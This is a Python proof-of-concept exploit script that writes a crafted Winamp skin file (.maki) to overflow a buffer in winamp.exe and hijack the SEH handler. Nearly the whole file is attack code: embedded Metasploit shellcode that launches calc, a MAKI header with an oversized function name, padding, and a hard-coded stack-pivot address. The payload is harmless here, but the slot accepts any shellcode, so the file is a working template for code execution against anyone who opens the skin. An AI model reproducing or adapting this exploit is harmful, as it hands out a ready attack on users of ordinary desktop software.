#!/usr/bin/env python
import struct


# windows/exec - 196 bytes
# http://www.metasploit.com
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
# CMD=calc
payload = ""
payload += "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
payload += "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
payload += "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
payload += "\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"
payload += "\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0"
payload += "\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b"
payload += "\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01"
payload += "\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2"
payload += "\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
payload += "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"
payload += "\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
payload += "\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b"
payload += "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd"
payload += "\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
payload += "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
payload += "\x00"


def build_skin(xpl):
    length_xpl = struct.pack('<H', len(xpl))  # unsigned short little endian
    header = "\x46\x47"             # magic
    header += "\x03\x04"            # version
    header += "\x17\x00\x00\x00"
    types = "\x01\x00\x00\x00"     # count
    # class 1 => Object
    types += "\x71\x49\x65\x51\x87\x0D\x51\x4A\x91\xE3\xA6\xB5\x32\x35\xF3\xE7"
    # functions
    functions = "\x37\x00\x00\x00"  # count
    # function 1
    functions += "\x01\x01"         # class
    functions += "\x00\x00"         # dummy
    functions += length_xpl      # function name length
    functions += xpl             # crafted function name

    maki = header
    maki += types
    maki += functions
    return maki


pad = 'A' * 0x34
rop = 'B' * 0x4
junk = 'A' * (16756 - len(pad) - len(rop))
# x86 jmp 0x06 + NOPs
nseh = struct.pack('<L', 0x90909090)
# (0x0044a567) ADD ESP,47C # RETN 0x10    ** [winamp.exe] **
# we needed 0x458 and we have 0x47C+0x10 = 0x48C; 0x48C - 0x458 = 0x34
sehhandler = struct.pack('<L', 0x13015407)
# there is no need for padding given that at some point a read is
# done from a not valid address, this will trigger SEH Handler
xpl = build_skin(pad + rop + junk + nseh + sehhandler + payload)

with open('mcvcore-dep-1.maki', 'wb') as fd:
    fd.write(xpl)
